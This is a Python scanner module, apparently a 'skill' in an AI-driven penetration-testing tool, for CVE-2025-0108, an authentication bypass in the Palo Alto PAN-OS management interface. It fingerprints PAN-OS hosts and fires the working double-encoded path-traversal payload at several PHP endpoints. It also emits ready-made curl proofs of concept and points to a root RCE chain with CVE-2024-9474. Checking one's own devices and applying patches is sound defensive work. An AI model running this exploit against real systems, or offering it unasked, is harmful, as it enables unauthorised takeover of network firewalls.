"""
PAN-OS Authentication Bypass — CVE-2025-0108
Skill #61 — PanOSAuthBypass

Research basis:
  Assetnote / Searchlight Cyber — Adam Kues (February 12, 2025)
  "Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)"
  https://slcyber.io/research-center/nginx-apache-path-confusion-to-auth-bypass-in-pan-os-cve-2025-0108/

Background:

  Palo Alto PAN-OS management interface processes requests through a three-layer
  stack: Nginx → Apache → PHP. Authentication is enforced at the Nginx layer by
  setting the X-pan-AuthCheck header based on URI matching. The Nginx rule marks
  any path beginning with /unauth/ as not requiring authentication.

  The vulnerability arises from a URL double-decoding effect introduced by Apache's
  mod_rewrite: when a per-directory RewriteRule triggers an internal redirect, the
  URL is decoded a second time by Apache. By embedding a double-encoded path traversal
  (%252e%252e → %2e%2e → ..) inside an /unauth/ prefix, an attacker causes:

    Nginx:  sees /unauth/...   → sets AuthCheck=off, no traversal detected
    Apache: RewriteRule match → internal redirect → second decode → ../  traversal
            → normalizes to /php/target.php → executes without authentication

  Discovery context:
    Assetnote researchers were analyzing the patch for CVE-2024-0012/CVE-2024-9474
    (a prior auth bypass + RCE chain). During patch review they identified the
    same suspicious three-layer architecture remained, leading to this zero-day.

Affected versions:
  PAN-OS < 10.2.14
  PAN-OS < 11.0.7
  PAN-OS < 11.2.5

Attack payload:
  GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1

  Step-by-step decode chain:
    1. Nginx receives: /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css
    2. Nginx decodes:  /unauth/%2e%2e/...  → no ".." → AuthCheck=off
    3. Apache receives same raw URL, decodes: %2e%2e still present
    4. RewriteRule matches PAN_help/x.css pattern → internal redirect
    5. Internal redirect decodes again: %2e%2e → .. (traversal!)
    6. Apache normalizes: /unauth/../php/... → /php/ztp_gate.php
    7. PHP executes with AuthCheck=off → full bypass

Impact:
  - Unauthenticated access to PAN-OS management PHP endpoints
  - Possible RCE chain with CVE-2024-9474 (privilege escalation)
  - Admin credential exposure, configuration disclosure
  - Full management interface takeover

AI auto-selection criteria:
  - Target responds on port 443 or 4443 with PAN-OS management interface patterns
  - Response contains PAN-OS-specific headers or HTML fingerprints
  - /php/login.php accessible (management console indicator)
"""
from __future__ import annotations

import time
from dataclasses import dataclass, field
from typing import Any

import httpx


# ── Evidence levels ───────────────────────────────────────────────────────────
VERIFIED    = "VERIFIED"
LIKELY      = "LIKELY"
INFERRED    = "INFERRED"
AI_ANALYSIS = "AI_ANALYSIS"

# ── PAN-OS fingerprint indicators ─────────────────────────────────────────────
_PANOS_INDICATORS = [
    "PAN_help",
    "pan-os",
    "GlobalProtect",
    "Palo Alto Networks",
    "palo-alto",
    "ztp_gate",
    "/php/login.php",
]

_PANOS_HEADERS = [
    "x-pan-",
    "x-panos",
    "set-cookie: PHPSESSID",   # PAN-OS PHP session
]

# PAN-OS management console ports to probe
_PANOS_PORTS = [443, 4443, 8443, 8080]

# PHP endpoints that prove authentication bypass
_BYPASS_TARGETS = [
    # (php_file, pan_help_path, description)
    ("ztp_gate.php",  "x.css",   "Zero Touch Provisioning endpoint"),
    ("login.php",     "x.css",   "Login PHP endpoint (auth-check off)"),
    ("errors.php",    "x.js",    "Error handler endpoint"),
    ("php_session.php", "x.html", "Session management endpoint"),
]


@dataclass
class PanosFinding:
    finding_type: str
    severity: str
    evidence_level: str
    title: str
    detail: str
    poc_curl: str = ""
    poc_response_snippet: str = ""
    remediation: str = ""
    cve: str = "CVE-2025-0108"
    cvss: float = 0.0


@dataclass
class PanosResult:
    target: str = ""
    panos_detected: bool = False
    panos_version: str = ""
    panos_indicators: list[str] = field(default_factory=list)
    management_port: int = 0
    auth_bypass_confirmed: bool = False
    bypass_endpoint: str = ""
    bypass_php_file: str = ""
    bypass_response_snippet: str = ""
    rce_chain_possible: bool = False
    findings: list[PanosFinding] = field(default_factory=list)
    error: str = ""
    scan_duration_s: float = 0.0
    evidence_summary: dict[str, int] = field(default_factory=dict)


class PanOSAuthBypassScanner:
    """
    Skill #61 — PanOSAuthBypassScanner

    Detects Palo Alto PAN-OS management interfaces and tests for
    CVE-2025-0108: authentication bypass via Nginx/Apache URL parsing
    confusion (double-encoded path traversal in /unauth/ prefix).

    AI auto-selection criteria:
      - Target on port 443/4443 with PAN-OS management HTML fingerprint
      - Response contains GlobalProtect / Palo Alto Networks strings
      - /php/login.php returns 200 (management console present)
      - x-pan-* response headers detected
    """

    TIMEOUT = 12.0
    UA = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    )

    def __init__(self, target: str, timeout: float = TIMEOUT):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self._client = httpx.Client(
            timeout=self.timeout,
            follow_redirects=False,   # important: don't follow — bypass relies on exact path
            verify=False,
            headers={"User-Agent": self.UA},
        )

    # ── Public API ────────────────────────────────────────────────────────────

    def scan(self) -> PanosResult:
        result = PanosResult(target=self.target)
        t0 = time.perf_counter()
        try:
            self._run(result)
        except Exception as exc:  # noqa: BLE001
            result.error = str(exc)
        finally:
            result.scan_duration_s = round(time.perf_counter() - t0, 2)
            result.evidence_summary = self._count_evidence(result.findings)
        return result

    # ── Internal logic ────────────────────────────────────────────────────────

    def _run(self, result: PanosResult) -> None:
        self._detect_panos(result)
        if not result.panos_detected:
            self._probe_alternate_ports(result)
        if not result.panos_detected:
            return
        self._test_auth_bypass(result)
        self._generate_findings(result)

    def _detect_panos(self, result: PanosResult) -> None:
        """Fingerprint PAN-OS management interface via HTTP."""
        probe_paths = [
            "/",
            "/php/login.php",
            "/global-protect/login.esp",
            "/ssl-vpn/login.html",
        ]
        indicators = []
        for path in probe_paths:
            try:
                r = self._client.get(f"{self.target}{path}")
                hdrs = str(r.headers).lower()
                body = r.text[:3000].lower()

                for hdr_kw in _PANOS_HEADERS:
                    if hdr_kw in hdrs:
                        indicators.append(f"Header: {hdr_kw}")

                for body_kw in _PANOS_INDICATORS:
                    if body_kw.lower() in body:
                        indicators.append(f"Body: {body_kw} at {path}")

                # Version extraction
                if "pan-os" in body:
                    import re
                    m = re.search(r"pan[-\s]?os[\s/v]+(\d+\.\d+\.\d+)", body, re.I)
                    if m:
                        result.panos_version = m.group(1)

                if indicators:
                    result.panos_detected = True
                    result.panos_indicators = list(dict.fromkeys(indicators))  # deduplicate
                    return

            except Exception:
                continue

    def _probe_alternate_ports(self, result: PanosResult) -> None:
        """Try PAN-OS management on alternate ports."""
        import re
        base_host = re.sub(r":\d+$", "", self.target.split("//", 1)[-1])
        scheme = "https" if "https" in self.target else "http"
        for port in _PANOS_PORTS:
            alt = f"{scheme}://{base_host}:{port}"
            try:
                r = httpx.get(
                    f"{alt}/php/login.php",
                    timeout=5.0,
                    verify=False,
                    follow_redirects=False,
                    headers={"User-Agent": self.UA},
                )
                body = r.text.lower()
                if any(kw.lower() in body for kw in _PANOS_INDICATORS):
                    result.panos_detected = True
                    result.management_port = port
                    result.panos_indicators.append(f"PAN-OS login page on port {port}")
                    self.target = alt
                    break
            except Exception:
                continue

    def _test_auth_bypass(self, result: PanosResult) -> None:
        """
        Test CVE-2025-0108: double-encoded path traversal auth bypass.

        Payload:  GET /unauth/%252e%252e/php/<target>.php/PAN_help/x.<ext>
        Expected: HTTP 200 with PHP execution (not 302 to login or 403)
        """
        for php_file, help_ext, description in _BYPASS_TARGETS:
            # Build the bypass URL
            bypass_path = (
                f"/unauth/%252e%252e/php/{php_file}"
                f"/PAN_help/x.{help_ext}"
            )
            bypass_url = f"{self.target}{bypass_path}"

            try:
                r = self._client.get(bypass_url)

                # Bypass success indicators:
                # 1. HTTP 200 (not 302 redirect to /php/login.php)
                # 2. Response body is NOT the login page
                # 3. Response contains PHP execution artifacts
                body = r.text
                body_lower = body.lower()

                is_login_redirect = (
                    r.status_code in (301, 302, 303) or
                    "location" in r.headers and "login.php" in r.headers.get("location", "")
                )
                is_access_denied = r.status_code in (403, 401)
                is_php_executed = (
                    r.status_code == 200 and
                    not is_login_redirect and
                    not is_access_denied and
                    # Confirm PHP ran (not just a static file)
                    any(php_sig in body_lower for php_sig in (
                        "<html", "<?php", "application/json",
                        "zero touch", "ztp", "session",
                        "error", "<!doctype"
                    ))
                )

                if is_php_executed:
                    result.auth_bypass_confirmed = True
                    result.bypass_endpoint = bypass_url
                    result.bypass_php_file = php_file
                    result.bypass_response_snippet = body[:400]
                    break

            except Exception:
                continue

        # Also check if RCE chain with CVE-2024-9474 could apply
        if result.auth_bypass_confirmed:
            result.rce_chain_possible = True

    # ── Finding generation ────────────────────────────────────────────────────

    def _generate_findings(self, result: PanosResult) -> None:
        if not result.panos_detected:
            return

        # PAN-OS detection
        result.findings.append(PanosFinding(
            finding_type="panos_detected",
            severity="INFO",
            evidence_level=VERIFIED,
            title=(
                "Palo Alto PAN-OS Management Interface Detected"
                + (f" v{result.panos_version}" if result.panos_version else "")
            ),
            detail=(
                f"Target {result.target} exposes PAN-OS management interface: "
                + ", ".join(result.panos_indicators[:4])
            ),
            poc_curl=f"curl -sk '{self.target}/php/login.php' | head -c 300",
            remediation="Upgrade PAN-OS: 10.2.14+ / 11.0.7+ / 11.2.5+",
        ))

        # Version check
        if result.panos_version:
            try:
                parts = result.panos_version.split(".")
                major, minor, patch = int(parts[0]), int(parts[1]), int(parts[2])
                is_vuln = (
                    (major == 10 and minor == 2 and patch < 14) or
                    (major == 11 and minor == 0 and patch < 7) or
                    (major == 11 and minor == 2 and patch < 5)
                )
                if is_vuln:
                    result.findings.append(PanosFinding(
                        finding_type="vulnerable_version",
                        severity="HIGH",
                        evidence_level=VERIFIED,
                        title=f"Vulnerable PAN-OS Version: {result.panos_version} — CVE-2025-0108",
                        detail=(
                            f"PAN-OS {result.panos_version} is affected by CVE-2025-0108. "
                            "Patched in: 10.2.14+ / 11.0.7+ / 11.2.5+."
                        ),
                        remediation="Upgrade PAN-OS immediately.",
                        cvss=7.5,
                    ))
            except (ValueError, IndexError):
                pass

        # Auth bypass confirmed
        if result.auth_bypass_confirmed:
            result.findings.append(PanosFinding(
                finding_type="auth_bypass_confirmed",
                severity="CRITICAL",
                evidence_level=VERIFIED,
                title=(
                    f"CVE-2025-0108 Auth Bypass CONFIRMED — "
                    f"/{result.bypass_php_file} executed without authentication"
                ),
                detail=(
                    f"Double-encoded path traversal (/unauth/%252e%252e/...) bypassed "
                    f"PAN-OS authentication. PHP file executed: {result.bypass_php_file}\n"
                    f"Response snippet: {result.bypass_response_snippet[:300]}"
                ),
                poc_curl=(
                    f"curl -sk '{self.target}/unauth/%252e%252e/php/"
                    f"{result.bypass_php_file}/PAN_help/x.css'"
                ),
                poc_response_snippet=result.bypass_response_snippet[:300],
                remediation=(
                    "CRITICAL: Apply patch immediately.\n"
                    "1. Upgrade PAN-OS: 10.2.14+ (10.2.x), 11.0.7+ (11.0.x), 11.2.5+ (11.2.x)\n"
                    "2. Restrict management interface access: whitelist admin IPs only\n"
                    "3. Do NOT expose management interface to the internet\n"
                    "4. Apply Palo Alto's recommended mitigations (PAN-273971)"
                ),
                cvss=9.3,
            ))

            # RCE chain potential
            result.findings.append(PanosFinding(
                finding_type="rce_chain_possible",
                severity="CRITICAL",
                evidence_level=LIKELY,
                title="CVE-2025-0108 + CVE-2024-9474 RCE Chain — Auth Bypass → Privilege Escalation → Root",
                detail=(
                    "CVE-2025-0108 auth bypass combined with CVE-2024-9474 "
                    "(privilege escalation) can achieve root RCE on the PAN-OS device. "
                    "This is the same technique used in CVE-2024-0012 exploitation chains."
                ),
                poc_curl=(
                    f"# Step 1: Auth bypass (CVE-2025-0108)\n"
                    f"curl -sk '{self.target}/unauth/%252e%252e/php/"
                    f"ztp_gate.php/PAN_help/x.css'\n"
                    f"# Step 2: Privilege escalation (CVE-2024-9474) — manual step"
                ),
                remediation=(
                    "Patch both CVE-2025-0108 AND CVE-2024-9474 simultaneously."
                ),
                cvss=9.9,
            ))

    @staticmethod
    def _count_evidence(findings: list[PanosFinding]) -> dict[str, int]:
        counts: dict[str, int] = {}
        for f in findings:
            counts[f.evidence_level] = counts.get(f.evidence_level, 0) + 1
        return counts

    def close(self) -> None:
        self._client.close()

    def __enter__(self) -> "PanOSAuthBypassScanner":
        return self

    def __exit__(self, *_: Any) -> None:
        self.close()
